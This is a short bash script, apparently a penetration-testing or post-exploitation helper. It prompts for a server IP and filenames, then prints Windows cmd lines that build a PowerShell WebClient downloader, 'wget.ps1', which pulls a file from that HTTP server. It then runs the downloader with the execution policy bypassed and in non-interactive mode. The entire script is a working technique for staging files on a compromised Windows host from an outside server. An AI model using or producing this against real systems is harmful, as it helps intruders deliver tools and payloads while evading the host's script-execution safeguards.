#!/bin/bash

read -p "HTTP Server IP: " ip
read -p "GET filename: " fromfile
read -p "Write to local file: " tofile

>&2 echo ""
echo "echo \$storageDir = \$pwd > wget.ps1"
echo "echo \$webclient = New-Object System.Net.WebClient >>wget.ps1"
echo "echo \$url = \"http://$ip/$fromfile\" >>wget.ps1"
echo "echo \$file = \"$tofile\" >>wget.ps1"
echo "echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1"
echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
